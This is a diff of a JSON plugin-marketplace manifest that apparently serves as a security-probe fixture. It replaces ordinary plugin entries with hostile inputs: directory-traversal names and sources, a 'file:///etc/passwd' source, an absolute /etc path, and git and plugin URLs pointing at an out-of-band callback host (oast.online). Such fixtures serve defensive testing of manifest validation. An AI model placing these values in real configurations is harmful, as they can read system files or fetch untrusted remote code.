@@ -1,38 +1,43 @@
 {
-  "name": "anf572",
+  "name": "anf572b",
   "owner": {
-    "name": "anf572"
+    "name": "anf572b"
   },
   "plugins": [
     {
-      "name": "p0sem"
+      "name": "q0trav",
+      "source": "../../../../anf572b-traversal"
     },
     {
-      "name": "p1str",
-      "source": "anf572-string-simples"
+      "name": "../q1nome",
+      "source": "./anf572b"
     },
     {
-      "name": "p2obj",
-      "source": {}
+      "name": "q2url",
+      "source": "https://anf572b-src.db6qie10ga51sb1ne1k09bkgroutgwxxn.oast.online/plugin"
     },
     {
-      "name": "p3git",
+      "name": "q3obj",
       "source": {
-        "type": "git_repository"
+        "type": "git_repository",
+        "url": "https://anf572b-giturl.db6qie10ga51sb1ne1k09bkgroutgwxxn.oast.online/r.git"
       }
     },
     {
-      "name": "p4trav",
-      "source": "../../../../anf572-traversal"
+      "name": "q4file",
+      "source": "file:///etc/passwd"
     },
     {
-      "name": "../p5nome",
-      "source": "./anf572"
+      "name": "q5abs",
+      "source": "/etc/anf572b-absoluto"
     },
     {
-      "name": "p6extra",
-      "source": "./anf572",
-      "anf572_campo_extra": true
+      "name": "q6extra",
+      "source": "./anf572b",
+      "anf572_campo_extra": true,
+      "repository": {
+        "url": "https://anf572b-repo.db6qie10ga51sb1ne1k09bkgroutgwxxn.oast.online/r"
+      }
     }
   ]
 }
